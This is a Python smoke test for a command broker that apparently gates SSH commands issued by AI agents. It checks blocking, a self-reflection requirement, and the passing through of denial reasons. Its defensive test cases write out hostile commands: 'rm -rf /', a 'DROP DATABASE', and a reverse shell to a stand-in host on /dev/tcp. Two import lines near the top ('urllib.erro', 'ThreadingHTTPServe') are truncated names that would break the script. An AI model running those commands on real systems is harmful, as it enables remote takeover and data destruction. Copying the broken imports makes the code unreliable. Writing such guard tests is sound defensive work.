# -*- coding: utf-8 -*-
"""端到端 HTTP 冒烟：在本地起一个真实 HTTP 服务，发真实请求，
验证三级拦截（403/400/428）、自审透传、拒绝原因透传的状态码与响应体。

    python3 tools/smoke_test.py
不碰真实保险箱、不连真实机器（ssh_exec 被打桩），可放心反复跑。
"""
import json
import sys
import threading
from pathlib import Path
import time
import urllib.erro
import urllib.request
from http.server import ThreadingHTTPServe

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "broker"))
import agentkeyguard as vb

# ── 准备一个内存保险箱（不读盘、不需要主密码） ──
vb.Broker.vault = {"profiles": {"t": {"type": "ssh", "user": "root", "host": "127.0.0.1",
                                      "port": 22, "sudo": "none"}}}
vb.Broker.key = None
vb.Broker.token = "smoke-token"
vb.BARK_BASE = ""                      # 不推手机
vb.PORTAL_IP_GUARD = False

# ── 把审批和执行都打桩，只看门禁放不放行 ──
seen = []
real_aa = vb.ask_approval


def fake_aa(kind, profile, target, detail, source, **kw):
    seen.append({"kind": kind, "profile": profile, "dangerous": kw.get("dangerous"),
                 "self_reflection": kw.get("self_reflection"), "detail": detail})
    return True


vb.ask_approval = fake_aa
vb.ssh_exec = lambda *a, **k: {"exit_code": 0, "stdout": "ok\n", "stderr": "",
                               "host": "127.0.0.1", "escalated": False, "elapsed_ms": 1}

srv = ThreadingHTTPServer(("127.0.0.1", 7799), vb.Broker)
srv.daemon_threads = True
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.3)

H = {"Authorization": "Bearer smoke-token", "Content-Type": "application/json"}


def call(cmd, reflection=None):
    body = {"profile": "t", "cmd": cmd, "title": "冒烟测试"}
    if reflection is not None:
        body["self_reflection"] = reflection
    req = urllib.request.Request("http://127.0.0.1:7799/ssh/exec",
                                 data=json.dumps(body).encode(), headers=H, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode())


CASES = [
    # (命令, self_reflection, 期望状态, 说明)
    ("rm -rf /", None, 403, "绝对禁区：不弹审批"),
    ("DROP DATABASE stock_raw", None, 403, "SQL 禁区（走 ssh 也按命令匹配）"),
    ("vim /etc/hosts", None, 400, "交互式"),
    ("sudo -i", None, 400, "root shell"),
    ("systemctl restart nginx", None, 428, "高危缺反思 → 428"),
    ("systemctl restart nginx", "  ", 428, "反思只有空格 → 仍 428"),
    ("systemctl restart nginx", "我是云端Agent，我在host-5，我打算重启host-6上的nginx，确认继续",
     200, "高危带反思 → 放行执行"),
    ("reboot", None, 428, "reboot 高危"),
    ("systemctl status nginx", None, 200, "普通命令直接放行"),
    ("ls -l /var/log", None, 200, "普通命令直接放行"),
    ("kill -9 12345", None, 428, "强杀进程高危"),
    ("kill -9 12345", "我是Agent，我在host-4，我要强杀卡死的12345，确认继续", 200, "强杀带反思"),
    ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", None, 403, "反弹 shell 禁区"),
]

fails = []
for cmd, refl, want, why in CASES:
    code, body = call(cmd, refl)
    tag = "OK " if code == want else "FAIL"
    if code != want:
        fails.append((cmd, refl, want, code, body))
    extra = ""
    if code == 428:
        extra = f" | rule={body.get('rule')} instr={body['instruction'][:18]}…"
    elif code == 403:
        extra = f" | type={body.get('type')} reason={body.get('reason')}"
    elif code == 400:
        extra = f" | type={body.get('type')}"
    print(f"{tag} {code} (want {want}) {why:22s} {cmd[:44]!r}{extra}")

print(f"\n共 {len(CASES)} 例，失败 {len(fails)} 例")
print(f"ask_approval 被调用 {len(seen)} 次：")
for s in seen:
    print(f"   dangerous={s['dangerous']} 反思={ (s['self_reflection'] or '')[:24] !r}")

# 拒绝原因透传：打桩 ask_approval 模拟"用户拒绝并写了原因"，
# 验证 _handle_ssh 把它原样变成 Agent 收到的响应体（与自检 [39]② 同一路径）
vb.ask_approval = lambda *a, **k: (k["out"].update(
    {"ok": False, "decision": "no", "reason": "我在跑任务，晚点再重启"}) or False)
code, body = call("ls -l /var/log")
print(f"\n拒绝透传：HTTP {code} {body}")
assert code == 403, code
assert body == {"error": "用户拒绝", "reason": "我在跑任务，晚点再重启",
                "type": "user_denied"}, body

srv.shutdown()
if fails:
    print("\n❌ 有用例失败")
    sys.exit(1)
print("\n✅ 端到端 HTTP 冒烟全部通过")
